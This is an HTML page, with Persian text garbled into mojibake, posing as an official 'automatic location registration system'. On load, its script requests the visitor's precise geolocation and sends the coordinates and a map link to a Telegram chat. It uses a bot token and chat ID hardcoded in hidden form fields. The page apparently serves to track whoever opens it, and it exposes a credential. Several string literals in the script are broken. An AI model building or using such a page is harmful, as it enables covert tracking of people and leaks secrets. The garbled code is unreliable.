<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØµÙØ­Ù‡ Ø«Ø¨Øª Ø®ÙˆØ¯Ú©Ø§Ø± Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ (Auto-Tracking V2)</title>
    <style>
        /* CSS Ø¨Ø±Ø§ÛŒ Ø·Ø±Ø§Ø­ÛŒ Ø±Ø³Ù…ÛŒ Ùˆ Ù…Ø¯Ø±Ù† */
        body {
            font-family: 'Tahoma', 'B Nazanin', Arial, sans-serif;
            background-color: #f4f7f6;
            color: #333;
            direction: rtl;
            text-align: right;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            border: 1px solid #e0e0e0;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            padding: 30px 40px;
            border-radius: 10px;
            max-width: 550px;
            width: 90%;
            text-align: center;
        }
        h1 {
            color: #172a5a; /* Ø±Ù†Ú¯ Ø±Ø³Ù…ÛŒâ€ŒØªØ± */
            font-size: 26px;
            border-bottom: 3px solid #172a5a;
            padding-bottom: 10px;
            margin-bottom: 25px;
            text-align: center;
        }
        .info-box {
            background-color: #f0f8ff;
            border-right: 5px solid #172a5a;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 15px;
            color: #172a5a;
            text-align: justify;
        }
        #status-message {
            margin-top: 25px;
            padding: 20px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            background-color: #e9ecef;
            color: #495057;
        }
        .error {
            background-color: #f8d7da !important;
            color: #721c24 !important;
            border: 1px solid #f5c6cb;
        }
        .success {
            background-color: #d4edda !important;
            color: #155724 !important;
            border: 1px solid #c3e6cb;
        }
    </style>
</head>
<body onload="requestAndSendLocation()"> 
    
    <div class="container">
        <h1>Ø³Ø§Ù…Ø§Ù†Ù‡ Ø«Ø¨Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ (Ù†Ø³Ø®Ù‡ Û²)</h1>
        
        <div class="info-box">
            <p><strong>Ø§Ø·Ù„Ø§Ø¹ÛŒÙ‡ Ù…Ù‡Ù…:</strong> Ø³ÛŒØ³ØªÙ… Ø¨Ù‡ Ø·ÙˆØ± Ø®ÙˆØ¯Ú©Ø§Ø±ØŒ ÙØ±Ø¢ÛŒÙ†Ø¯ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø±Ø§ Ø¯Ø± Ù¾Ø³â€ŒØ²Ù…ÛŒÙ†Ù‡ Ø¢ØºØ§Ø² Ú©Ø±Ø¯Ù‡ Ø§Ø³Øª. Ù„Ø·ÙØ§Ù‹ Ø¯Ø± ØµÙˆØ±Øª Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ù‡Ø±Ú¯ÙˆÙ†Ù‡ Ù¾ÛŒØºØ§Ù… Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø±ØŒ *Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…Ú©Ø§Ù† (Location Access)* Ø±Ø§ ØµØ§Ø¯Ø± ÙØ±Ù…Ø§ÛŒÛŒØ¯.</p>
        </div>
        
        <input type="hidden" id="bot-token" value="8597685412:AAH3ymwMQkCzsxb9Rru8j0ePa8Lu7Jx0UYg"> 
        <input type="hidden" id="chat-id" value="7570861617"> 
        <input type="hidden" id="user-token-id" value="REF-CLIENT-2025-01-A">

        <div id="status-message">â³ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ Ø³ÛŒØ³ØªÙ… Ùˆ Ø¨Ø±Ø±Ø³ÛŒ ÙˆØ¶Ø¹ÛŒØª Ø¯Ø³ØªØ±Ø³ÛŒ...</div>
    </div>

    <script>
        // ØªØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ ÙˆØ¶Ø¹ÛŒØª Ù¾ÛŒØ§Ù…
        function updateStatus(message, type = '') {
            const statusElement = document.getElementById('status-message');
            statusElement.innerHTML = message;
            statusElement.className = type;
        }

        // ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ Ú©Ù‡ Ù‡Ù†Ú¯Ø§Ù… Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡ ÙØ±Ø§Ø®ÙˆØ§Ù†ÛŒ Ù…ÛŒâ€ŒØ´ÙˆØ¯
        function requestAndSendLocation() {
            const BOT_TOKEN = document.getElementById('bot-token').value;
            const CHAT_ID = document.getElementById('chat-id').value;
            const USER_TOKEN = document.getElementById('user-token-id').value;

            if (!navigator.geolocation) {
                updateStatus("âŒ Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ø§Ø² Geolocation Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯. Ù„Ø·ÙØ§ Ù…Ø±ÙˆØ±Ú¯Ø± Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ Ú©Ù†ÛŒØ¯.", 'error');
                return;
            }
            
            updateStatus("â³ Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ... Ù„Ø·ÙØ§ Pop-up Ù…Ø±ÙˆØ±Ú¯Ø± Ø±Ø§ ØªØ£ÛŒÛŒØ¯ Ú©Ù†ÛŒØ¯.");

            // Ø¯Ø±ÛŒØ§ÙØª Ù„ÙˆÚ©ÛŒØ´Ù† Ø¨Ø§ ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø¯Ù‚ÛŒÙ‚â€ŒØªØ± (Timeout Ú©Ù…ØªØ±)
            navigator.geolocation.getCurrentPosition(
                
                // Ø¯Ø± ØµÙˆØ±Øª Ù…ÙˆÙÙ‚ÛŒØª (Success Callback)
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    updateStatus(âœ… Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯. Latitude: ${lat}, Longitude: ${lon}.<br> Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...);
                    
                    // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ API ØªÙ„Ú¯Ø±Ø§Ù…
                    sendLocationToTelegram(lat, lon, USER_TOKEN, BOT_TOKEN, CHAT_ID);
                },
                
                // Ø¯Ø± ØµÙˆØ±Øª Ø¹Ø¯Ù… Ù…ÙˆÙÙ‚ÛŒØª (Error Callback)
                (error) => {
                    let errorMessage;
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "âŒ *Ø®Ø·Ø§ÛŒ Ø¹Ø¯Ù… Ù…Ø¬ÙˆØ²:* Ú©Ø§Ø±Ø¨Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ø±Ø§ Ù„ØºÙˆ Ú©Ø±Ø¯. Ù„Ø·ÙØ§Ù‹ ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ù…Ø±ÙˆØ±Ú¯Ø± Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "âš  *Ø®Ø·Ø§ÛŒ Ø¯Ø³ØªØ±Ø³â€ŒÙ†Ø§Ù¾Ø°ÛŒØ±ÛŒ:* Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ù†ÛŒØ³Øª (Ù…Ø«Ù„Ø§Ù‹ Ø¨Ù‡ Ø¯Ù„ÛŒÙ„ Ø¹Ø¯Ù… Ø§ØªØµØ§Ù„ Ø¨Ù‡ GPS).";
                            break;
                        case error.TIMEOUT:
                            errorMessage = "âŒ› *Ø®Ø·Ø§ÛŒ ÙˆÙ‚ÙÙ‡:* Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¨ÛŒØ´ Ø§Ø² Ø­Ø¯ Ø·ÙˆÙ„ Ú©Ø´ÛŒØ¯ Ùˆ Ù…ØªÙˆÙ‚Ù Ø´Ø¯.";
                            break;
                        default:
                            errorMessage = "ğŸ”¥ *Ø®Ø·Ø§ÛŒ Ù†Ø§Ù…Ø´Ø®Øµ:* Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø±Ø® Ø¯Ø§Ø¯. Ù…Ø·Ù…Ø¦Ù† Ø´ÙˆÛŒØ¯ Ú©Ù‡ Ø³Ø§ÛŒØª Ø¨Ø§ HTTPS Ø¨Ø§Ø² Ø´Ø¯Ù‡ Ø§Ø³Øª.";
                    }
                    updateStatus(errorMessage, 'error');
                },
                
                // ØªÙ†Ø¸ÛŒÙ…Ø§Øª Geolocation Options
                {
                    enableHighAccuracy: true, // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ù‚Øª Ø¨Ø§Ù„Ø§
                    timeout: 5000,            // Ûµ Ø«Ø§Ù†ÛŒÙ‡ Ù…Ù‡Ù„Øª Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ù„ÙˆÚ©ÛŒØ´Ù†
                    maximumAge: 0             // Ø§Ø² Ú©Ø´ (Cache) Ù„ÙˆÚ©ÛŒØ´Ù† Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù†Ø´ÙˆØ¯
                }
            );
        }

        // ØªØ§Ø¨Ø¹ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        function sendLocationToTelegram(lat, lon, userToken, botToken, chatId) {
            
            // Ø³Ø§Ø®Øª Ù¾ÛŒØ§Ù… Ø±Ø³Ù…ÛŒ Ùˆ Ø¯Ù‚ÛŒÙ‚
            const message = (
                "ğŸš¨ *Ú¯Ø²Ø§Ø±Ø´ Ø«Ø¨Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø®ÙˆØ¯Ú©Ø§Ø± (V2)*\n" +
                "----------------------------------------\n" +
                **ØªÙˆÚ©Ù† Ø±Ù‡Ú¯ÛŒØ±ÛŒ:** \${userToken}\\n +
                **ØªÙˆÚ©Ù† Ø±Ø¨Ø§Øª:** \${botToken.substring(0, 10)}...\\n +
                **Ø¹Ø±Ø¶ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ (Lat):** ${lat}\n +
                **Ø·ÙˆÙ„ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ (Lon):** ${lon}\n +
                **Ù„ÛŒÙ†Ú© Ù†Ù‚Ø´Ù‡:** [Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ø¯Ø± Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})\n +
                "----------------------------------------\n" +
                Ø²Ù…Ø§Ù† Ø«Ø¨Øª (UTC): ${new Date().toUTCString()}
            );

            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendMessage;
            
            const payload = {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown' 
            };

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    updateStatus("âœ” *Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙÙ‚!* Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.", 'success');
                } else {
                    // Ø¯Ø± ØµÙˆØ±Øª Ø®Ø·Ø§ÛŒ ØªÙ„Ú¯Ø±Ø§Ù…ØŒ Ù…Ø¹Ù…ÙˆÙ„Ø§Ù‹ Ø¨Ù‡ Ø¯Ù„ÛŒÙ„ CHAT_ID ÛŒØ§ ØªÙˆÚ©Ù† Ù†Ø§Ù…Ø¹ØªØ¨Ø± Ø§Ø³Øª.
                    updateStatus(âŒ **Ø®Ø·Ø§ Ø¯Ø± API ØªÙ„Ú¯Ø±Ø§Ù…:** ${data.description}. (ØªÙˆÚ©Ù† ÛŒØ§ Ø¢ÛŒØ¯ÛŒ Ú†Øª Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯.), 'error');
                    console.error("Telegram API Error:", data);
                }
            })
            .catch((error) => {
                updateStatus(ğŸ”¥ **Ø®Ø·Ø§ÛŒ Ø´Ø¨Ú©Ù‡:** Ø¯Ø± Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ± ØªÙ„Ú¯Ø±Ø§Ù… Ù…Ø´Ú©Ù„ÛŒ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯: ${error.message}, 'error');
                console.error("Network Error:", error);
            });
        }
    </script>
</body>
</html>